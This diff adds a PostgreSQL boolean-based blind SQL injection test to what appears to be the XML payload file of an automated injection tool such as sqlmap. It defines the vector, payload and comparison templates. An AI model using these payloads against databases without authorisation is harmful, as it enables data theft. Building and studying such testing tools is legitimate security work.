@@ -725,6 +725,22 @@ Formats:
             <dbms>Oracle</dbms>
         </details>
     </test>
+
+    <test>
+        <title>PostgreSQL boolean-based blind - Parameter replace</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>ASCII(CHR(CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0 END))</vector>
+        <request>
+            <payload>ASCII(CHR(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0 END))</payload>
+        </request>
+        <response>
+            <comparison>ASCII(CHR(CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 0 END))</comparison>
+        </response>
+    </test>
     <!-- TODO: check against Microsoft Access and SAP MaxDB -->
     <!-- End of boolean-based blind tests - Parameter replace -->
 
